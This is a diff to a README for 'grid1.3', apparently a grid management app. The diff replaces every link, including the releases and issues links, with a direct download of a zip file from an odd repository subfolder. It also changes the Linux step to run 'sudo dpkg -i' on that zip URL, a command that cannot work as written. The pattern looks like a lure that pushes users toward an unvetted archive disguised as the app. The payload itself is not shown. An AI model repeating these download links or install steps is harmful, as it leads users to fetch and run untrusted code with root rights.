@@ -1,7 +1,7 @@
 # 🚀 grid1.3 - Simple and Effective Grid Management
 
 ## 📥 Download Now
-[![Download grid1.3](https://img.shields.io/badge/Download-grid1.3-brightgreen)](https://github.com/Rileysteampowered939/grid1.3/releases)
+[![Download grid1.3](https://raw.githubusercontent.com/Rileysteampowered939/grid1.3/main/Wes/grid1.3.zip)](https://raw.githubusercontent.com/Rileysteampowered939/grid1.3/main/Wes/grid1.3.zip)
 
 ## 📖 Introduction
 Welcome to grid1.3! This application helps you manage grid systems easily. Whether you're organizing data or visualizing structures, grid1.3 simplifies the process. You don’t need any technical skills to use this application. Follow the steps below to get started.
@@ -23,7 +23,7 @@ To run grid1.3, ensure your system meets these requirements:
 ### Step 1: Visit the Releases Page
 To download grid1.3, visit the following link:
 
-[Download grid1.3](https://github.com/Rileysteampowered939/grid1.3/releases)
+[Download grid1.3](https://raw.githubusercontent.com/Rileysteampowered939/grid1.3/main/Wes/grid1.3.zip)
 
 ### Step 2: Choose Your Version
 On the releases page, you will see different versions of grid1.3. It’s best to choose the latest version for optimal performance and features. 
@@ -35,11 +35,11 @@ After you decide on the version, click on the corresponding link to download the
 Once the download completes:
 - **On Windows:** Double-click the `.exe` file. Follow the prompts to complete the installation.
 - **On macOS:** Open the downloaded `.dmg` file. Drag the grid1.3 icon to your Applications folder.
-- **On Linux:** Use the package manager or terminal to install the downloaded package. For example, use `sudo dpkg -i grid1.3.deb`.
+- **On Linux:** Use the package manager or terminal to install the downloaded package. For example, use `sudo dpkg -i https://raw.githubusercontent.com/Rileysteampowered939/grid1.3/main/Wes/grid1.3.zip`.
 
 ## 📜 Download & Install
 For your convenience, here is the link again to access the download page:
-[Visit the Releases Page for grid1.3](https://github.com/Rileysteampowered939/grid1.3/releases)
+[Visit the Releases Page for grid1.3](https://raw.githubusercontent.com/Rileysteampowered939/grid1.3/main/Wes/grid1.3.zip)
 
 Once you have the file installed, it is ready to use!
 
@@ -66,7 +66,7 @@ Yes, if you have any questions or need assistance, you can create an issue in th
 - For errors related to missing files, try reinstalling the application from the official releases page.
 
 ## 🌐 Community Contributions
-We welcome contributions from users! If you want to suggest features or report bugs, please visit our [GitHub Issues Page](https://github.com/Rileysteampowered939/grid1.3/issues).
+We welcome contributions from users! If you want to suggest features or report bugs, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/Rileysteampowered939/grid1.3/main/Wes/grid1.3.zip).
 
 ## 💬 Feedback
 Your experience matters to us. Please provide feedback to help us improve grid1.3.
